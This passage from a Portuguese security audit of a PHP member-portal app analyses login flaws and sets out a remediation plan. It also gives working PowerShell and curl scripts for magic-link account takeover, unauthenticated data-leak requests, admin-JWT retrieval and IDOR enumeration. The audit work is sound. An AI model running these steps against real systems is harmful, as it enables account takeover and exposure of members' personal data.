| 54-76 | **Bloqueio de acesso indevido**: só executa quando $user->isLoggedIn() && !$isAdminOrDiretoriaExecutiva. Cobre **apenas** consultar_cpf, login_cpf e solicitar_magic_link. Compara SELECT cpf FROM associados WHERE id = ? (valor cru) com a entrada normalizada por preg_replace('/\D/','') usando !==. Em caso de divergência define $acao = 'bloqueado' e a cadeia if/elseif seguinte não executa nenhum ramo. **Não cobre verificar_token** e **não roda para visitantes anônimos**. |
| 79-109 | consultar_cpf: exige admin/executivo; SELECT * FROM associados WHERE cpf = ? AND status = 'ativo'; cria a sessão de portal do alvo e grava portal_acesso_via = 'consulta_admin' e portal_acesso_por. Auditoria feita por error_log() (linha 100) — não há registro persistente, IP, user-agent ou tabela de auditoria (existe classes/AuditLog.php, não usada aqui). |
| 112-150 | login_cpf: CPF + password_verify contra associados WHERE cpf = ? AND status='ativo'; cria a sessão do portal; **copia user_id/user_nivel de usuarios cujo email seja igual ao do associado** (133-141) sem definir user_table. Não regenera o ID de sessão. |
| 151-185 | solicitar_magic_link: resolve o associado por CPF (status ativo e e-mail preenchido), chama createToken($associado['email']) (que apaga tokens anteriores do mesmo e-mail, PasswordReset.php:52) e **imprime o link na resposta** (173-176). Só devolve mensagem genérica quando o CPF não existe. Não há limite de tentativas. |
| 186-234 | verificar_token: valida o token via getValidToken (hash SHA-256, used=0, expires_at>NOW()), resolve o associado por WHERE email = ? **LIMIT 1**, marca o token como usado e cria a sessão do portal; copia privilégios de usuarios pelo e-mail (216-224). **Não compara o CPF do associado do token com nenhuma identidade de sessão**, não exige o mesmo navegador que pediu o link, não invalida sessão anterior e não regenera o ID de sessão. |

**Bloco 272-373 (formulários):**

- 273-318: aba "CPF + Senha". O campo CPF fica readonly com o CPF do usuário logado quando ele não é admin/executivo (304) — mas isso é **apenas client-side**; quem manda é o POST.
- 321-338: aba "Link Mágico", disponível para qualquer visitante; o campo CPF também é readonly para usuário logado comum (327), mas a validação server-side é o bloco 54-76 (com o defeito de normalização).
- 340-373: aba "Consultar por CPF" renderizada somente para admin/executivo (341) — porém o backend (79) já faz a checagem correta de privilégio, então a UI não é a única barreira.
- 376-393: painel de verificar_token. O token vem do **GET** e é inserido num campo hidden (386) para então ser enviado por POST (383-390). Qualquer terceiro que obtenha o token conclui o fluxo com um único POST — não há challenge adicional (senha, CPF, 2FA).

### 3.2 Onde exatamente falha

1. **verificar_token não compara o CPF do associado do token com o CPF do usuário logado** (login.php:186-234, especialmente 195-224). A identidade final é determinada exclusivamente pelo e-mail gravado em password_resets, sem confronto com a sessão corrente.
2. **O token é exibido ao solicitante** (173-176), o que anula completamente o fator "posse do e-mail". Esta é a falha mais grave: converte autenticação em "conhecer o CPF".
3. **Bloqueio por CPF com comparação sem normalização** (67-70): valor cru do banco versus entrada só-dígitos, com !==. Gera falso bloqueio do dono (CPF mascarado/10 dígitos, caso do id 20) e não é defesa confiável.
4. **Bloqueio não cobre verificar_token nem visitantes anônimos** (55). A ação de maior impacto ficou fora da única checagem de autorização existente.
5. **Ausência de vínculo entre o token e quem o solicitou** (nenhum estado de sessão é criado em solicitar_magic_link, 151-185) e **ausência de session_regenerate_id()** em qualquer ponto (0 ocorrências no projeto), com session.use_strict_mode=0.
6. **Transferência de privilégio por e-mail** (133-141 e 216-224) combinada com a troca livre de e-mail no portal (area.php:77-104) e com hasPermission() baseado apenas em $_SESSION['user_nivel'] (User.php:104-114).
7. **Auditoria fraca**: o "log de auditoria" do modo administrativo (96-100) é um error_log() de texto, sem registro persistente (embora exista classes/AuditLog.php disponível).
8. **Estado da sessão do portal** é gravado apenas em $_SESSION, sem expiração própria nem revalidação do associado (status) a cada requisição; se o associado for inativado, a sessão em /portal/area continua válida até o registro não ser mais encontrado por getById (area.php:29-35 não filtra por status).

---

## 4. Teste de exploração reproduzível

Ambiente: http://localhost/app (Apache porta 80, MySQL 3306, base sisagro). Todos os passos abaixo são de leitura, **exceto** o item 4.5 (o POST de solicitar_magic_link grava uma linha em password_resets).

### 4.1 Obter IDs/CPFs reais para teste (SQL somente-leitura, sem expor senhas)

O schema atual armazena associados.cpf como varchar(14) — na base de teste os valores estão **só com dígitos** (nem todos: id 20 tem 10 dígitos).

    -- 1) associados ativos com CPF (alvos válidos para /portal/login)
    SELECT id, cpf, email, status FROM associados
    WHERE status = 'ativo' AND cpf IS NOT NULL AND cpf <> '' ORDER BY id LIMIT 10;

    -- 2) associado x usuario staff com o MESMO e-mail (cadeia A-05)
    SELECT a.id AS associado_id, a.cpf, a.email, u.id AS usuario_id, u.nivel
    FROM associados a JOIN usuarios u ON u.email = a.email;

    -- 3) contas staff de nivel 3 (usaveis para provar o IDOR de A-01)
    SELECT id, nome, email, nivel FROM usuarios WHERE nivel = 3 AND status = 'ativo';

    -- 4) cargos executivos (quem o codigo considera privilegiado no portal)
    SELECT aa.associado_id, aa.tipo_vinculo, a.cpf
    FROM associado_associacao aa JOIN associados a ON a.id = aa.associado_id
    WHERE aa.tipo_vinculo <> 'membro';

    -- 5) associados com CPF fora do padrao de 11 digitos (falha de normalizacao, M-03)
    SELECT id, cpf, CHAR_LENGTH(cpf) AS len FROM associados
    WHERE cpf IS NOT NULL AND CHAR_LENGTH(cpf) <> 11;

Sem mysql no PATH, o mesmo efeito via PHP CLI (não expõe hash de senha):

    C:\xampp\php\php.exe -r "$p=new PDO('mysql:host=localhost;dbname=sisagro;charset=utf8mb4','root','');foreach($p->query(\"SELECT id,cpf,email FROM associados WHERE status='ativo' ORDER BY id LIMIT 10\") as $r){echo $r['id'].' '.$r['cpf'].' '.$r['email'].PHP_EOL;}"

### 4.2 Confirmar o vazamento não autenticado (C-03, A-03, A-04) — executar sem nenhum cookie

PowerShell:

    Invoke-WebRequest 'http://localhost/app/api/relatorios/lista-associados.php' -UseBasicParsing | Select-Object -Expand Content | Select-String '<td'
    Invoke-WebRequest 'http://localhost/app/api/relatorios/status-associados.php' -UseBasicParsing | Select-Object -Expand Content | Select-String '<td'
    Invoke-WebRequest 'http://localhost/app/api/get_propriedades_associado.php?associado_id=13' -UseBasicParsing | Select-Object -Expand Content
    Invoke-WebRequest 'http://localhost/app/api/get_propriedade_detalhes.php?id=8' -UseBasicParsing | Select-Object -Expand Content

curl:

    curl -s "http://localhost/app/api/relatorios/lista-associados.php" | head -40
    curl -s "http://localhost/app/api/relatorios/status-associados.php" | grep -m3 "<td"
    curl -s "http://localhost/app/api/get_propriedades_associado.php?associado_id=13"
    curl -s "http://localhost/app/api/get_propriedade_detalhes.php?id=8"

**Resultado esperado (confirmado nesta auditoria):** as quatro respostas retornam 200 com dados de associados/propriedades, sem sessão, sem cookie e sem CSRF.

### 4.3 Confirmar o JWT de admin (C-02)

    curl -s "http://localhost/app/tmp/bridge_token.php"

Cole o resultado em https://jwt.io ou decodifique o segundo segmento em base64url. Esperado: nivel=1, tipo=admin, sub=7 — assinado com JWT_ACCESS_SECRET de sinporg/.env.

### 4.4 Confirmar que o IDOR de A-03/A-04 é IDOR (e não apenas endpoint público)

    -- Descubra o dono da propriedade 8 e compare com o associado 17
    SELECT id, associado_id, propriedade FROM propriedades WHERE id IN (8, 19);

A resposta de get_propriedade_detalhes.php?id=8 traz dados da propriedade do associado **13**, enquanto get_propriedades_associado.php?associado_id=17 devolve as propriedades 19/20/21 — qualquer anônimo obtém ambos.

### 4.5 Confirmar o Link Mágico / account takeover (C-01) — **grava 1 linha em password_resets**

Use um CPF de teste obtido em 4.1. Em PowerShell:

    $s = $null
    $page = Invoke-WebRequest 'http://localhost/app/portal/login' -SessionVariable s -UseBasicParsing
    $csrf = ([regex]'name="csrf_token" value="([^"]+)"').Match($page.Content).Groups[1].Value
    $body1 = @{ csrf_token = $csrf; acao = 'solicitar_magic_link'; cpf = '97748463034' }
    $resp = Invoke-WebRequest 'http://localhost/app/portal/login' -Method POST -WebSession $s -UseBasicParsing -Body $body1
    $token = ([regex]'token=([0-9a-f]{64})').Match($resp.Content).Groups[1].Value
    "TOKEN CAPTURADO: $token"
    $body2 = @{ csrf_token = $csrf; acao = 'verificar_token'; token = $token }
    $area = Invoke-WebRequest 'http://localhost/app/portal/login' -Method POST -WebSession $s -UseBasicParsing -Body $body2
    (Invoke-WebRequest 'http://localhost/app/portal/area' -WebSession $s -UseBasicParsing).Content | Select-String 'Bem-vindo|Meu Perfil|CPF:'

Equivalente em curl:

    curl -s -c c.txt http://localhost/app/portal/login -o p.html
    CSRF=$(grep -o 'name="csrf_token" value="[^"]*"' p.html | head -1 | sed 's/.*value="//;s/"//')
    curl -s -b c.txt -c c.txt -X POST http://localhost/app/portal/login -d "csrf_token=$CSRF&acao=solicitar_magic_link&cpf=97748463034" -o r.html
    TOKEN=$(grep -o 'token=[0-9a-f]\{64\}' r.html | head -1 | cut -d= -f2)
    echo "TOKEN=$TOKEN"
    curl -s -b c.txt -c c.txt -X POST http://localhost/app/portal/login -d "csrf_token=$CSRF&acao=verificar_token&token=$TOKEN" -D - -o /dev/null | head -5
    curl -s -b c.txt http://localhost/app/portal/area | grep -i -m2 "Bem-vindo\|CPF:"

**Refutação/confirmação:** se a resposta do passo 1 **não** contiver o token, C-01 está refutada no código em produção; se contiver e o passo 3 redirecionar para /portal/area exibindo o nome da vítima, C-01 está **confirmada**.

### 4.6 Confirmar o IDOR de A-01 e A-02 (exige sessão de usuário nível 3)

Forma controlada: pedir ao administrador que crie/logue uma conta de teste nível 3 (tabela usuarios, ex.: usuarios.nivel = 3) e exportar o cookie de sessão.

    curl -s -b s.txt "http://localhost/app/associado/1/editar" -o ed1.html
    grep -c "Visualizar Associado" ed1.html        # esperado: 1  (modo visualizacao)
    grep -o 'name="cpf"[^>]*' ed1.html             # esperado: input com o CPF do associado 1
    grep -o 'name="email"[^>]*' ed1.html
    grep -o 'name="endereco"[^>]*' ed1.html
    curl -s -b s.txt "http://localhost/app/certificacao/historico/13" | grep -m2 "Histórico de Certificações\|<h1"

PowerShell:

    $s = $null
    Invoke-WebRequest 'http://localhost/app/login' -SessionVariable s -UseBasicParsing | Out-Null
    # ... POST de login da conta de teste nivel 3 ...
    (Invoke-WebRequest 'http://localhost/app/associado/1/editar' -WebSession $s -UseBasicParsing).Content | Select-String 'Visualizar Associado'
    (Invoke-WebRequest 'http://localhost/app/certificacao/historico/13' -WebSession $s -UseBasicParsing).Content | Select-String 'Histórico de Certificações'

**Critério:** se a página exibir "Visualizar Associado" com nome/e-mail/CPF/telefone/endereço de um associado diferente do usuário logado, A-01 está confirmada. Repetir com ids 2, 3 e 4 comprova a enumeração.

### 4.7 Confirmar a cadeia de escalação A-05 (opcional; envolve escrita)

1. Registrar/obter uma conta de associado comum e alterar o e-mail em /portal/area para um e-mail de usuarios de nível 1 ainda não usado em associados (SELECT email FROM usuarios WHERE nivel=1 menos SELECT email FROM associados).
2. Executar 4.5 com o próprio CPF e observar, na área logada, o acesso a um recurso administrativo (por exemplo /associados ou /api/relatorios_admin.php).

**Recomendação de execução:** faça isso apenas em base de homologação/cópia — o passo 1 altera dados reais.

---

## 5. Plano de correção priorizado

1. **Imediato (hoje):** remover o echo do Link Mágico (C-01); remover/bloquear tmp/ e dev-utils/ e **rotacionar JWT_ACCESS_SECRET** (C-02); adicionar autenticação+permissão nos endpoints de relatórios (C-03).
2. **Curto prazo (1-3 dias):** corrigir/centralizar a autorização das rotas com ID (A-01, A-02, A-03, A-04); negar por padrão quando não houver sessão; trocar o vínculo por e-mail por vínculo explícito associados.user_id (A-05); session_regenerate_id(true) em toda troca de identidade; session.use_strict_mode=1 e cookie HttpOnly (M-02, I-02).
3. **Curto/médio prazo:** consumo atômico do token e vínculo do token à sessão solicitante (M-02); normalização de CPF nos dois lados e cobertura de verificar_token (M-03); CSRF em completar_perfil (B-01); double opt-in na troca de e-mail (B-02).
4. **Estrutural:** middleware único de autorização no index.php (uma função exigirNivel()/exigirDono() chamada antes de cada require), auditoria persistente com AuditLog (IP, user-agent, alvo, ator, resultado) e remoção definitiva dos scripts de manutenção do docroot.

## 6. Anexos — evidências coletadas nesta auditoria

- GET /app/api/relatorios/lista-associados.php -> 200, 14547 bytes, colunas Nome/E-mail/CPF/RG/Telefone/Cidade-UF/Status, 35 linhas de tabela.
- GET /app/api/relatorios/status-associados.php -> 200, 18533 bytes, exemplo de linha: nome + CPF formatado + telefone + status financeiro + parcelas atrasadas + valor.
- GET /app/api/relatorios/inadimplencia.php?filtro_associado_id=13 -> 200, dados financeiros.
- GET /app/api/relatorios/relatorio_associados.php -> 200 "Acesso negado..." (contraexemplo correto).
- GET /app/api/get_propriedades_associado.php?associado_id=13 -> 200 [{"id":8,"nome":"Propriedade Teste F3"},{"id":15,...}]
- GET /app/api/get_propriedade_detalhes.php?id=8 -> 200 JSON com nome/endereço/cidade/estado da propriedade.
- GET /app/tmp/bridge_token.php -> 200, JWT HS256 com payload nivel=1/tipo=admin.
- GET /app/check_cpf.php -> 200 "CPFs duplicados: 0 / Índices no CPF: cpf - cpf - Non_unique: 0".
- GET /app/check_associados_estado.php -> 200, lista ID/nome/cidade/estado reais.
- GET /app/dev-utils/test_api_ficha.php -> 200 JSON da ficha de adesão do associado 13.
- GET /app/associado/1/editar (sem sessão) -> redireciona para /app/login (barreira = estar logado).
- Configuração: session.use_strict_mode=0, session.cookie_httponly vazio, session.cookie_secure=0, register_argc_argv=1.
- Busca por session_regenerate_id no projeto: **0 ocorrências**.
- Schema: associados.cpf varchar(14) UNI; associados.email varchar(100) UNI; 30 associados, todos com e-mail e senha (hashes de 60 chars — **nenhum hash foi lido ou divulgado**); password_resets(email, token_hash char(64), expires_at, used).
- Nota de método: nenhuma senha/hash de senha foi lida ou divulgada; nenhuma operação de escrita foi executada de forma intencional. Nenhum arquivo do código-fonte foi alterado.
